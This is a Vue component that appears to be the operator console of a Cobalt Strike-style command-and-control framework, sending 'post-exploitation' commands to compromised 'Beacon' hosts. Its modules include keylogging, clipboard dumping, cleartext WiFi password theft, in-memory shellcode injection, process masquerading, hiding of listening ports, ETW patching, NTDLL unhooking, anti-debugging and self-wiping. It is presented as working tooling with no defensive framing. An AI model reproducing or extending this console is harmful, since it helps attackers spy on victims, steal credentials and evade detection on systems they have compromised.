<template>
  <div class="cs-tools-view cs-font-ui">
    <!-- CS Toolbar -->
    <div class="ct-toolbar">
      <div class="ct-title-group">
        <span class="ct-title">{{ isZh ? '后渗透工具箱: ' : 'Post-Exploitation Toolkit: ' }}{{ currentClientTitle }}</span>
        <span class="ct-count">({{ isZh ? `共 ${toolList.length} 个功能模块` : `${toolList.length} modules available` }})</span>
      </div>

      <div class="ct-spacer" />

      <el-input
        v-model="searchKeyword"
        :placeholder="isZh ? '过滤模块名称...' : 'Filter module name...'"
        size="small"
        clearable
        class="ct-search"
      />
    </div>

    <!-- Master-Detail Split Workspace -->
    <div class="ct-split-body">
      <!-- Left Master List (CS Session Table Style) -->
      <div class="ct-left-panel">
        <el-table
          :data="filteredToolList"
          size="small"
          height="100%"
          highlight-current-row
          class="cs-session-table"
          @current-change="onSelectTool"
        >
          <el-table-column prop="name" :label="isZh ? '功能模块' : 'Module'" width="160" sortable show-overflow-tooltip>
            <template #default="{ row }">
              <span class="tool-name font-bold">{{ row.name }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="category" :label="isZh ? '分类' : 'Category'" width="110" sortable align="center">
            <template #default="{ row }">
              <span class="category-badge">{{ row.category }}</span>
            </template>
          </el-table-column>
          <el-table-column prop="desc" :label="isZh ? '功能说明' : 'Description'" min-width="180" show-overflow-tooltip>
            <template #default="{ row }">
              <span class="text-dim">{{ row.desc }}</span>
            </template>
          </el-table-column>
        </el-table>
      </div>

      <!-- Right Detail & Param Form + Output Terminal -->
      <div class="ct-right-panel">
        <div v-if="selectedTool" class="ct-config-card">
          <div class="ct-card-header">
            <span class="header-title">{{ selectedTool.name }} ({{ selectedTool.category }})</span>
            <span class="header-desc">{{ selectedTool.desc }}</span>
          </div>

          <div class="ct-card-form">
            <!-- Dynamic Param Form based on selectedTool.id -->
            <div v-if="selectedTool.id === 'services' || selectedTool.id === 'service_stop'" class="cs-form-row">
              <label class="cs-form-label">{{ isZh ? '服务名称 (可选):' : 'Service Name (optional):' }}</label>
              <el-input v-model="serviceName" placeholder="e.g. Spooler, W32Time" size="small" style="width: 240px" />
            </div>

            <div v-else-if="selectedTool.id === 'reg_query'" class="cs-form-row">
              <label class="cs-form-label">{{ isZh ? '注册表路径:' : 'Registry Key Path:' }}</label>
              <el-input v-model="regPath" placeholder="HKCU\Software\Microsoft\Windows\CurrentVersion\Run" size="small" style="width: 400px" />
            </div>

            <div v-else-if="selectedTool.id === 'hideprocess'" class="cs-form-row">
              <label class="cs-form-label">{{ isZh ? '伪装进程名:' : 'Masquerade Name:' }}</label>
              <el-input v-model="fakeName" placeholder="systemd" size="small" style="width: 240px" />
            </div>

            <div v-else-if="selectedTool.id === 'hidenet'" class="cs-form-row">
              <label class="cs-form-label">{{ isZh ? '隐藏端口 (1-65535):' : 'Port to Hide (1-65535):' }}</label>
              <el-input v-model="hidePort" placeholder="4444" size="small" style="width: 160px" />
            </div>

            <div v-else class="ct-no-params">
              <span class="cs-font-mono text-dim">{{ isZh ? '无需额外参数，点击【执行】即可下发指令。' : 'No extra parameters required. Click Execute to issue command.' }}</span>
            </div>
          </div>
        </div>

        <div v-else class="ct-empty-selection">
          {{ isZh ? '请从左侧列表选择一个后渗透模块进行配置与执行。' : 'Select a post-exploitation module from the left list to configure and execute.' }}
        </div>

        <!-- Terminal Output Area -->
        <div class="ct-output-header">
          <span>{{ isZh ? '执行控制台日志' : 'Execution Console Log' }}</span>
          <button class="cs-btn cs-btn-xs" @click="consoleLogs = []">{{ isZh ? '清空' : 'Clear' }}</button>
        </div>
        <div class="ct-output-console cs-font-mono" v-loading="!!loading">
          <div v-for="(log, i) in consoleLogs" :key="i" class="log-line">
            <span class="log-time">[{{ log.time }}]</span>
            <span class="log-tag" :class="log.type">[{{ log.type.toUpperCase() }}]</span>
            <span class="log-msg">{{ log.msg }}</span>
          </div>
          <div v-if="!consoleLogs.length" class="empty-log">
            {{ isZh ? '就绪等待执行。输出结果将在此处及 Beacon 控制台同步展示。' : 'Ready for execution. Output results will stream here and to Beacon Console.' }}
          </div>
        </div>
      </div>
    </div>

    <!-- Bottom Action Bar (CS Native Button Row) -->
    <div class="ct-bottom-bar">
      <button
        class="cs-btn cs-btn-primary"
        :disabled="!selectedTool || !!loading"
        @click="executeSelectedTool"
      >
        {{ loading ? (isZh ? '执行中...' : 'Executing...') : (isZh ? '执行' : 'Execute') }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'keylog'"
        class="cs-btn"
        @click="runTool('keylog_get')"
      >
        {{ isZh ? '获取击键记录' : 'Get Keystrokes' }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'keylog'"
        class="cs-btn cs-btn-danger"
        @click="runTool('keylog_stop')"
      >
        {{ isZh ? '停止键盘记录' : 'Stop Keylogger' }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'hideprocess'"
        class="cs-btn"
        @click="runTool('hideprocess off')"
      >
        {{ isZh ? '恢复进程名' : 'Restore Process Name' }}
      </button>

      <button
        v-if="selectedTool && selectedTool.id === 'hidenet'"
        class="cs-btn cs-btn-danger"
        @click="runTool('hidenet off')"
      >
        {{ isZh ? '停止隐藏端口' : 'Stop Hide Port' }}
      </button>

      <button class="cs-btn" @click="handleHelp">
        {{ isZh ? '帮助' : 'Help' }}
      </button>
    </div>
  </div>
</template>

<script setup lang="ts">
import { computed, inject, ref } from 'vue'
import type { ComputedRef, Ref } from 'vue'
import { useRoute } from 'vue-router'
import { ElMessage, ElMessageBox } from 'element-plus'
import ClientAPI from '@/api/clients'
import { useClientUid } from '@/utils/clientUtils'
import { useClientsStore } from '@/stores/clients'
import { useI18nStore } from '@/stores/i18n'
import { useWorkspaceStore } from '@/stores/workspace'

const i18nStore = useI18nStore()
const workspace = useWorkspaceStore()
const isZh = computed(() => i18nStore.isZh)

interface ToolItem {
  id: string
  name: string
  category: string
  desc: string
}

interface ConsoleLog {
  time: string
  type: 'info' | 'succ' | 'warn' | 'err'
  msg: string
}

const route = useRoute()
const clientsStore = useClientsStore()

const injectedUid = inject<Ref<string> | ComputedRef<string> | null>('realUid', null)
const getUid = () => {
  const v = injectedUid && (injectedUid as any).value ? String((injectedUid as any).value) : ''
  if (v && v.length > 10) return v
  const mapped = useClientUid(route)
  return typeof mapped === 'string' && mapped.length > 10 ? mapped : ''
}

const currentClientTitle = computed(() => {
  const uid = getUid()
  if (!uid) return 'Active Beacon'
  const c = clientsStore.getClientByUid(uid)
  return c ? `${c.Computer || c.Username || 'Beacon'} (${c.InternalIP || c.ExternalIP || '127.0.0.1'})` : uid.slice(0, 8)
})

const searchKeyword = ref('')
const selectedTool = ref<ToolItem | null>(null)
const loading = ref('')
const consoleLogs = ref<ConsoleLog[]>([])

const serviceName = ref('')
const regPath = ref('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run')
const fakeName = ref('systemd')
const hidePort = ref('4444')

const toolList = ref<ToolItem[]>([
  { id: 'clipboard', name: 'Clipboard Dump', category: 'Gather', desc: 'Read target user active clipboard text content' },
  { id: 'wifi', name: 'WiFi Passwords', category: 'Credentials', desc: 'Extract stored WiFi profile names and cleartext passwords' },
  { id: 'keylog', name: 'Keystroke Logger', category: 'Spying', desc: 'Capture keyboard inputs (Windows API Hook / Linux input device)' },
  { id: 'services', name: 'Services Manager', category: 'System', desc: 'List, start, or stop Windows/Linux background system services' },
  { id: 'reg_query', name: 'Registry Query', category: 'Persistence', desc: 'Query Windows Registry key values and startup items' },
  { id: 'migrate', name: 'Process Migration', category: 'Injection', desc: 'In-memory injection: generate stageless shellcode and inject into a process (no disk write)' },
  { id: 'hideprocess', name: 'Process Masquerade', category: 'Stealth', desc: 'Override process name & argv on Linux (ps/top masquerading)' },
  { id: 'hidenet', name: 'Network Connection Hide', category: 'Stealth', desc: 'LD_PRELOAD /proc/net hook to hide active listening port' },
  { id: 'selfdelete', name: 'Self Delete / Wipe', category: 'Evasion', desc: 'Permanently remove beacon binary from disk and terminate' },
  { id: 'etw_patch', name: 'ETW Patch', category: 'Evasion', desc: 'Patch Event Tracing for Windows to blind ETW-based detection' },
  { id: 'unhook_ntdll', name: 'Unhook NTDLL', category: 'Evasion', desc: 'Restore ntdll.dll hooks/patches to bypass userland monitoring' },
  { id: 'sandbox_check', name: 'Sandbox Check', category: 'Evasion', desc: 'Probe for sandbox/VM artifacts; adjust behavior accordingly' },
  { id: 'antidebug', name: 'Anti-Debug', category: 'Evasion', desc: 'Enable anti-debugger protections (IsDebuggerPresent & friends)' },
  { id: 'service_stop', name: 'Service Stop', category: 'System', desc: 'Stop a Windows service by name' },
])

const filteredToolList = computed(() => {
  if (!searchKeyword.value.trim()) return toolList.value
  const kw = searchKeyword.value.toLowerCase().trim()
  return toolList.value.filter(
    (t) => t.name.toLowerCase().includes(kw) || t.desc.toLowerCase().includes(kw) || t.category.toLowerCase().includes(kw),
  )
})

function onSelectTool(row: ToolItem | null) {
  selectedTool.value = row
}

const getTime = () => new Date().toLocaleTimeString('en-GB')

const addLog = (type: 'info' | 'succ' | 'warn' | 'err', msg: string) => {
  consoleLogs.value.push({ time: getTime(), type, msg })
}

const runTool = async (cmd: string) => {
  const uid = getUid()
  if (!uid) {
    ElMessage.warning('Client not ready')
    return
  }
  loading.value = cmd
  addLog('info', `Issuing task to Beacon [${uid.slice(0, 8)}]: ${cmd}`)
  try {
    await ClientAPI.send_commands({ uid, command: cmd })
    addLog('succ', `Task queued successfully: ${cmd}. See Beacon console for results.`)
    ElMessage.success(`Command "${cmd}" sent to Beacon`)
  } catch (e: any) {
    addLog('err', `Task execution failed: ${e?.message || 'Network error'}`)
    ElMessage.error('Command dispatch failed')
  } finally {
    loading.value = ''
  }
}

function executeSelectedTool() {
  if (!selectedTool.value) return
  const tool = selectedTool.value.id

  if (tool === 'clipboard') {
    runTool('clipboard')
  } else if (tool === 'wifi') {
    runTool('wifi')
  } else if (tool === 'keylog') {
    runTool('keylog_start')
  } else if (tool === 'services') {
    if (serviceName.value.trim()) {
      runTool(`service_start ${serviceName.value.trim()}`)
    } else {
      runTool('services')
    }
  } else if (tool === 'reg_query') {
    runTool(`reg_query ${regPath.value.trim()}`)
  } else if (tool === 'migrate') {
    // 内存注入迁移：打开注入迁移对话框（生成无阶段 shellcode → 内存下发 → 注入，不落盘）
    const uid = getUid()
    if (!uid) {
      ElMessage.warning(isZh.value ? '客户端未就绪' : 'Beacon session not ready')
      return
    }
    workspace.openDialog('migrate', { uid, pid: '' })
  } else if (tool === 'hideprocess') {
    runTool(`hideprocess ${fakeName.value.trim() || 'systemd'}`)
  } else if (tool === 'hidenet') {
    const port = hidePort.value.trim()
    if (!/^\d+$/.test(port) || +port < 1 || +port > 65535) {
      ElMessage.warning('Please enter a valid port (1-65535)')
      return
    }
    runTool(`hidenet on ${port}`)
  } else if (tool === 'selfdelete') {
    ElMessageBox.confirm(
      'Permanently delete client binary from disk and terminate session? This cannot be undone.',
      'Self Delete Confirmation',
      { confirmButtonText: 'Confirm Wipe', cancelButtonText: 'Cancel', type: 'warning' },
    ).then(() => {
      runTool('selfdelete')
    }).catch(() => {})
  } else if (tool === 'etw_patch') {
    runTool('etw_patch')
  } else if (tool === 'unhook_ntdll') {
    runTool('unhook_ntdll')
  } else if (tool === 'sandbox_check') {
    runTool('sandbox_check')
  } else if (tool === 'antidebug') {
    runTool('antidebug')
  } else if (tool === 'service_stop') {
    if (!serviceName.value.trim()) {
      ElMessage.warning('Please enter a service name')
      return
    }
    runTool(`service_stop ${serviceName.value.trim()}`)
  }
}

function handleHelp() {
  ElMessage.info('Post-Exploitation Modules Reference')
}
</script>

<style scoped>
.cs-tools-view {
  height: 100%;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.ct-toolbar {
  height: 32px;
  background: var(--cs-panel);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  gap: 8px;
  padding: 0 10px;
  flex-shrink: 0;
}

.ct-title-group {
  display: flex;
  align-items: center;
  gap: 6px;
}

.ct-title {
  font-size: 12px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.ct-count {
  font-size: 11px;
  color: var(--cs-text-dim);
}

.ct-spacer { flex: 1; }

.ct-search { width: 220px; }

.ct-split-body {
  flex: 1;
  display: flex;
  overflow: hidden;
}

.ct-left-panel {
  width: 420px;
  border-right: 1px solid var(--cs-border);
  display: flex;
  flex-direction: column;
}

.ct-right-panel {
  flex: 1;
  display: flex;
  flex-direction: column;
  background: var(--cs-bg);
  overflow: hidden;
}

.tool-name { color: var(--cs-text-bright); }

.category-badge {
  font-size: 10px;
  padding: 1px 5px;
  border-radius: 2px;
  background: var(--cs-menubar-hover);
  color: var(--cs-active);
  font-weight: 600;
}

.text-dim {
  font-size: 11px;
  color: var(--cs-text-dim);
}

.ct-config-card {
  padding: 12px 16px;
  border-bottom: 1px solid var(--cs-border);
  background: var(--cs-panel);
}

.ct-card-header {
  display: flex;
  flex-direction: column;
  gap: 2px;
  margin-bottom: 12px;
}

.header-title {
  font-size: 13px;
  font-weight: 600;
  color: var(--cs-text-bright);
}

.header-desc {
  font-size: 11px;
  color: var(--cs-text-dim);
}

.cs-form-row {
  display: flex;
  align-items: center;
  gap: 10px;
}

.cs-form-label {
  font-size: 11px;
  color: var(--cs-text);
  min-width: 140px;
}

.ct-no-params {
  padding: 6px 0;
}

.ct-tech-hint {
  margin-top: 6px;
  font-size: 11px;
  color: var(--cs-text-dim);
  line-height: 1.5;
}

.ct-empty-selection {
  padding: 24px;
  color: var(--cs-text-dim);
  font-size: 12px;
}

.ct-output-header {
  height: 26px;
  background: var(--cs-titlebar-bg);
  border-bottom: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 10px;
  font-size: 11px;
  color: var(--cs-text-dim);
  font-weight: 600;
}

.ct-output-console {
  flex: 1;
  background: #000000;
  color: #c5c5c5;
  padding: 8px 10px;
  overflow-y: auto;
  font-size: 11px;
  line-height: 1.5;
}

.log-line {
  display: flex;
  gap: 6px;
  margin-bottom: 2px;
}

.log-time { color: #888888; }
.log-tag.info { color: #69b1ff; }
.log-tag.succ { color: #52c41a; }
.log-tag.warn { color: #faad14; }
.log-tag.err { color: #ff4d4f; }
.log-msg { color: #e0e0e0; }

.empty-log {
  color: #555555;
  font-style: italic;
  padding: 10px;
}

.ct-bottom-bar {
  height: 38px;
  background: var(--cs-panel);
  border-top: 1px solid var(--cs-border);
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 8px;
  padding: 0 12px;
  flex-shrink: 0;
}
</style>
